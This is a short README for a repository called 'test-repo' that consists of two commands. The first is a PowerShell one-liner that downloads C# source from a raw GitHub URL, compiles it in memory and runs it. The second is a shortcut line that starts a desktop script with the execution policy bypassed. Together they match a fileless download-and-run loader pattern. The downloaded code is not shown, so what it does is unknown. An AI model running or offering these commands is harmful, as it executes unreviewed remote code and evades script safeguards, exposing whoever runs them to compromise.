# test-repo

powershell: ```
Add-Type -TypeDefinition (new-object net.webclient).downloadstring("https://raw.githubusercontent.com/0x59R11/test-repo/main/code.cs") -Language CSharp;[Runner]::Run()```


shortcut: ```powershell.exe -executionPolicy bypass -noexit -file "C:\Users\adm1n\Desktop\run.ps1" 'SALAM'```
